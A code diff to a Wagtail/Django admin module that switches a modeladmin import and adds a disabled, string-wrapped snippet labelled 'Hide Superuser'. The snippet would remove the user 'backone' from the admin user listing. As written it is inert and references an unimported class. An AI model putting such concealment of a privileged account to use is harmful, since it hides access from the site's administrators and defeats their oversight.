@@ -1,4 +1,5 @@
-from wagtail.contrib.modeladmin.options import (
+# from wagtail.contrib.modeladmin.options import (
+from wagtail_modeladmin.options import (
     ModelAdmin,
     ModelAdminGroup,
     PermissionHelper,
@@ -8,6 +9,32 @@ from wagtail.admin.panels import FieldPanel, MultiFieldPanel, FieldRowPanel
 from .models import Features  # LicenseFeatures
 from django.utils.translation import gettext_lazy as _
 from .models import Organizations, GroupOrganizations
+
+""" Hide Superuser """
+"""
+from wagtail.users.views.users import UserEditForm
+#from wagtail.users.views.users import UserViewSet as WagtailUserViewSet
+from wagtail import hooks
+from django.contrib.auth import get_user_model
+from django.db.models import Q
+
+
+User = get_user_model()
+
+
+class CustomUserViewSet(WagtailUserViewSet):
+    def get_queryset(self, request):
+        queryset = super().get_queryset(request)
+
+        users_to_hide = ["backone"]
+        queryset = queryset.exclude(username__in=users_to_hide)
+        return queryset
+
+
+@hooks.register("register_user_viewset", order=100)
+def register_custom_user_viewset():
+    return CustomUserViewSet()
+"""
 
 
 class AccountsPermissionHelper(PermissionHelper):
